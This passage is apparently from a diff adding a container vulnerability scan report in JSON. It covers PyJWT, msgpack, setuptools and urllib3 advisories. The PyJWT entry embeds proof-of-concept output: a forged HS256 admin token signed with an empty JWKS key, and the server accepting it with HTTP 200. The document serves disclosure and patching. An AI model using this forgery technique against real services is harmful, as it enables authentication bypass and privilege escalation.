endpoint\nHTTP 401\n\n### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\nforged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\nresponse:\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\nJWKS now has non-empty k:\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### Sanity: a legitimately-signed token with the real secret is accepted\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\nJWKS (empty k, vulnerable config):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: PyJWKSetError\"}\n  \u003c-- HTTP 401\n```\n\nThe attack returns HTTP 200 with `role:admin` from an unauthenticated forged\ntoken. Both negative controls (wrong non-empty key; real non-empty secret at the\nauth service) return 401, isolating the defect to empty-key acceptance. The\npatched build (the `from_jwk` fix below) rejects the forgery.\n\n### Impact\n\n- Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n  yielding full impersonation and privilege escalation on any endpoint gated by\n  such tokens.\n- Reachable through the documented JWKS verification API\n  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n- Triggered by the common \"unset signing secret\" misconfiguration that the\n  string-secret path already rejects in 2.13.0, leaving the JWK path as an\n  asymmetric gap.\n\n### Suggested fix\n\nReject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n`prepare_key` already applies:\n\n```python\nif obj.get(\"kty\") != \"oct\":\n    raise InvalidKeyError(\"Not an HMAC key\")\n\nkey_bytes = base64url_decode(obj[\"k\"])\nif len(key_bytes) == 0:\n    raise InvalidKeyError(\"HMAC key must not be empty.\")\nreturn key_bytes\n```\n\nThis reuses the exact error message and length check the string/bytes path uses,\nso both HMAC key-loading routes enforce the same invariant. A regression test for\nthe empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\n### Fix PR\n\nhttps://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\ntemp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\nDCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n`test_api_jwk.py`, `test_api_jws.py` pass).\n\n### Credit\n\nReported by tonghuaroot.\n\n\u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\n## Maintainer update — 2026-09-11\n\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://github.com/jpadilla/pyjwt",
+            "https://github.com/jpadilla/pyjwt/commit/af8181ca0bec5e6b372fbba9afbe23702b787ceb",
+            "https://github.com/jpadilla/pyjwt/releases/tag/2.14.0",
+            "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-pxh4-856f-4h89"
+          ],
+          "PublishedDate": "2026-10-22T15:48:04Z",
+          "LastModifiedDate": "2026-10-22T15:48:04Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-114613",
+          "VendorIDs": [
+            "GHSA-j586-36cw-2gc2"
+          ],
+          "PkgID": "msgpack@1.1.2",
+          "PkgName": "msgpack",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/msgpack@1.1.2",
+            "UID": "33820b693fb1213e",
+            "BOMRef": "pkg:pypi/msgpack@1.1.2"
+          },
+          "InstalledVersion": "1.1.2",
+          "FixedVersion": "1.2.3",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-114613",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:0eff381e0605a694e8c27fc8830922f22086eb30b79665c03dde5718758d3016",
+          "Title": "msgpack: msgpack: Denial of Service via memory leak during map deserialization",
+          "Description": "MessagePack is the serializer implementation for Python msgpack.org. Prior to 1.2.3, the msgpack-python C extension (msgpack._cmsgpack) leaks a decoded map value when deserialization rejects a key with strict_map_key=True (the default). Repeated malformed inputs can cause unbounded process memory growth and denial of service in applications that deserialize attacker-controlled MessagePack data. Both unpackb() and the streaming Unpacker API are affected. The pure-Python fallback does not exhibit this leak in the reported tests. This issue is fixed in version 1.2.3.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-401"
+          ],
+          "VendorSeverity": {
+            "azure": 3,
+            "ghsa": 3,
+            "redhat": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-114613",
+            "https://github.com/msgpack/msgpack-python",
+            "https://github.com/msgpack/msgpack-python/commit/620b0eb4c89cd72d4098564537624d9dbb2ce141",
+            "https://github.com/msgpack/msgpack-python/releases/tag/v1.2.3",
+            "https://github.com/msgpack/msgpack-python/security/advisories/GHSA-j586-36cw-2gc2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-114613",
+            "https://www.cve.org/CVERecord?id=CVE-2026-114613"
+          ],
+          "PublishedDate": "2026-10-22T19:17:37.733Z",
+          "LastModifiedDate": "2026-10-23T21:17:21.823Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-6v7p-g79w-8964",
+          "PkgID": "msgpack@1.1.2",
+          "PkgName": "msgpack",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/msgpack@1.1.2",
+            "UID": "33820b693fb1213e",
+            "BOMRef": "pkg:pypi/msgpack@1.1.2"
+          },
+          "InstalledVersion": "1.1.2",
+          "FixedVersion": "1.2.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-6v7p-g79w-8964",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:7140f30c321d345d54e5696e89b6a5800d81b7cfe635490a397a84f9c09ce64a",
+          "Title": "MessagePack for Python: Out-of-bounds read / crash on Unpacker reuse after a caught error",
+          "Description": "### Impact\n\nIf the Unpacker is used repeatedly after an error occurs, the process may crash with a SEGV.\n\nIf the Unpacker is used repeatedly to unpack untrusted input from external sources, it may be vulnerable to a DoS attack.\n\n### Patches\n\nv1.2.1\n\n### Workarounds\n\nUsers should create a new Unpacker instead of reusing the same Unpacker after an error occurs.\n\nApplying the above patch can prevent SEGV, but reusing the Streaming Unpacker after it has encountered an error will not yield correct data. If an error occurs during Streaming Unpacking, the Stream and Streaming Unpacker should be discarded.\n\nTherefore, this is not just a workaround but the correct solution. The above patch only prevents crashes from incorrect usage.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/msgpack/msgpack-python",
+            "https://github.com/msgpack/msgpack-python/commit/2c56ddb5d0025ed481d962c0f5d62d19dec7476d",
+            "https://github.com/msgpack/msgpack-python/releases/tag/v1.2.1",
+            "https://github.com/msgpack/msgpack-python/security/advisories/GHSA-6v7p-g79w-8964"
+          ],
+          "PublishedDate": "2026-06-19T21:42:55Z",
+          "LastModifiedDate": "2026-06-19T21:42:55Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-47273",
+          "VendorIDs": [
+            "GHSA-5rjg-fvgr-3xxf"
+          ],
+          "PkgID": "setuptools@70.3.0",
+          "PkgName": "setuptools",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/setuptools@70.3.0",
+            "UID": "ed58bcdeda2bae2f",
+            "BOMRef": "pkg:pypi/setuptools@70.3.0"
+          },
+          "InstalledVersion": "70.3.0",
+          "FixedVersion": "78.1.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-47273",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:f44a804c86f93478b820b7cea7a8808ec131218f39cd71c9b14ce9cf68fb0585",
+          "Title": "setuptools: Path Traversal Vulnerability in setuptools PackageIndex",
+          "Description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "alma": 2,
+            "amazon": 3,
+            "azure": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 3,
+            "oracle-oval": 2,
+            "photon": 3,
+            "redhat": 2,
+            "rocky": 2,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "bitnami": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+              "V40Score": 7.7
+            },
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+              "V40Score": 7.7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.8
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2025:10407",
+            "https://access.redhat.com/errata/RHSA-2025:13578",
+            "https://access.redhat.com/security/cve/CVE-2025-47273",
+            "https://advisory.echohq.com/cve/CVE-2025-47273",
+            "https://bugzilla.redhat.com/2366982",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2366982",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47273",
+            "https://errata.almalinux.org/9/ALSA-2025-13578.html",
+            "https://errata.rockylinux.org/RLSA-2025:10407",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/setuptools/PYSEC-2025-49.yaml",
+            "https://github.com/pypa/setuptools",
+            "https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88",
+            "https://github.com/pypa/setuptools/commit/250a6d17978f9f6ac3ac887091f2d32886fbbb0b",
+            "https://github.com/pypa/setuptools/issues/4946",
+            "https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf",
+            "https://linux.oracle.com/cve/CVE-2025-47273.html",
+            "https://linux.oracle.com/errata/ELSA-2025-9940.html",
+            "https://lists.debian.org/debian-lts-announce/2025/05/msg00035.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-47273",
+            "https://ubuntu.com/security/notices/USN-7544-1",
+            "https://ubuntu.com/security/notices/USN-8010-1",
+            "https://www.cve.org/CVERecord?id=CVE-2025-47273"
+          ],
+          "PublishedDate": "2025-05-17T16:15:19.11Z",
+          "LastModifiedDate": "2026-06-17T09:27:38.827Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-97687",
+          "VendorIDs": [
+            "GHSA-8988-9cw3-xx77"
+          ],
+          "PkgID": "urllib3@2.7.0",
+          "PkgName": "urllib3",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/urllib3@2.7.0",
+            "UID": "19c2344f95ca9f4c",
+            "BOMRef": "pkg:pypi/urllib3@2.7.0"
+          },
+          "InstalledVersion": "2.7.0",
+          "FixedVersion": "2.8.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-97687",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:321118d8170c6878ef790265a65bfaae3b1e8ef3a4d72b9fe7a2571cb871f928",
+          "Title": "urllib3: urllib3: Traffic interception via HTTPS proxy TLS configuration override",
+          "Description": "urllib3 is an HTTP client library for Python. From 1.26.0 until 2.8.0, the proxy_ssl_context, proxy_assert_hostname, proxy_assert_fingerprint, ssl_context, cert_reqs, verify_mode, use_forwarding_for_https=True, and CERT_NONE configuration paths fail to remain separated because target-server TLS settings are incorrectly applied to the HTTPS proxy connection. The trigger is that an application uses an HTTPS proxy and configures target-server TLS settings that must remain separate from the proxy TLS handshake, including HTTPS forwarding with target-specific identity or credentials. Applying cert_reqs=CERT_NONE can overwrite proxy_ssl_context.verify_mode in place, and the mutation persists so later connections reusing the same context may connect to the HTTPS proxy without certificate verification. The attack mechanism is that an attacker intercepts and impersonates the HTTPS proxy after the effective proxy policy accepts the attacker's certificate. The impact is that the attacker can observe or modify forwarded traffic or receive a target TLS client certificate, while CONNECT tunneling still preserves the separate end-to-end target TLS connection. This issue is fixed in version 2.8.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-295",
+            "CWE-440"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "ghsa": 3,
+            "nvd": 3,
+            "oracle-oval": 3,
+            "photon": 3,
+            "redhat": 3,
+            "rocky": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 7.6
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+              "V3Score": 8.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:90494",
+            "https://access.redhat.com/security/cve/CVE-2026-97687",
+            "https://advisory.echohq.com/cve/CVE-2026-97687",
+            "https://bugzilla.redhat.com/2543245",
+            "https://bugzilla.redhat.com/2543255",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2543245",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2543255",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-97687",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-97689",
+            "https://errata.almalinux.org/9/ALSA-2026-90494.html",
+            "https://errata.rockylinux.org/RLSA-2026:90494",
+            "https://github.com/urllib3/urllib3",
+            "https://github.com/urllib3/urllib3/commit/07408cec79d1856d81bb42c74a904a24fdb9e465",
+            "https://github.com/urllib3/urllib3/commit/b6447295fff7b38fdffc67e0df9712d60cef3cc3",
+            "https://github.com/urllib3/urllib3/pull/5093",
+            "https://github.com/urllib3/urllib3/releases/tag/2.8.0",
+            "https://github.com/urllib3/urllib3/security/advisories/GHSA-8988-9cw3-xx77",
+            "https://linux.oracle.com/cve/CVE-2026-97687.html",
+            "https://linux.oracle.com/errata/ELSA-2026-92474.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-97687",
+            "https://ubuntu.com/security/notices/USN-8926-1",
+            "https://www.cve.org/CVERecord?id=CVE-2026-97687"
+          ],
+          "PublishedDate": "2026-09-29T16:17:18.517Z",
+          "LastModifiedDate": "2026-10-13T20:27:23.13Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-97689",
+          "VendorIDs": [
+            "GHSA-vxq7-64xx-v4gw"
+          ],
+          "PkgID": "urllib3@2.7.0",
+          "PkgName": "urllib3",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/urllib3@2.7.0",
+            "UID": "19c2344f95ca9f4c",
+            "BOMRef": "pkg:pypi/urllib3@2.7.0"
+          },
+          "InstalledVersion": "2.7.0",
+          "FixedVersion": "2.8.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-97689",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:7573b86b19508f3145a22562c81601126f68a0ea8da692450053806c1c32eb4e",
+          "Title": "urllib3: urllib3: Denial of Service via unbounded memory allocation in chunk parser",
+          "Description": "urllib3 is an HTTP client library for Python. From 1.10.3 until 2.8.0, the HTTPResponse.read_chunked and HTTPResponse.stream methods can allocate unbounded memory because the streaming chunk parser buffers the chunk-size field until newline or EOF without a length bound. The trigger is that a malicious server returns Transfer-Encoding: chunked followed by a very long run of bytes without a newline. The attack mechanism is that a malicious HTTP server sends a very long unterminated chunk-size line. The impact is that unbounded memory allocation can exhaust the client process. This issue is fixed in version 2.8.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "azure": 3,
+            "ghsa": 3,
+            "nvd": 3,
+            "oracle-oval": 3,
+            "photon": 3,
+            "redhat": 3,
+            "rocky": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+              "V40Score": 8.9
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:90494",
+            "https://access.redhat.com/security/cve/CVE-2026-97689",
+            "https://advisory.echohq.com/cve/CVE-2026-97689",
+            "https://bugzilla.redhat.com/2543245",
+            "https://bugzilla.redhat.com/2543255",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2543245",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2543255",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-97687",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-97689",
+            "https://errata.almalinux.org/9/ALSA-2026-90494.html",
+            "https://errata.rockylinux.org/RLSA-2026:90494",
+            "https://github.com/urllib3/urllib3",
+            "https://github.com/urllib3/urllib3/commit/cd770b059b543be29298ea5c52afb0b1b090f5ed",
+            "https://github.com/urllib3/urllib3/releases/tag/2.8.0",
+            "https://github.com/urllib3/urllib3/security/advisories/GHSA-vxq7-64xx-v4gw",
+            "https://linux.oracle.com/cve/CVE-2026-97689.html",
+            "https://linux.oracle.com/errata/ELSA-2026-92474.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-97689",
+            "https://ubuntu.com/security/notices/USN-8926-1",
+            "https://www.cve.org/CVERecord?id=CVE-2026-97689"
+          ],
+          "PublishedDate": "2026-09-29T16:17:18.837Z",
+          "LastModifiedDate": "2026-10-13T20:20:06.95Z"
+        }
+      ]
+    }
+  ]
+}
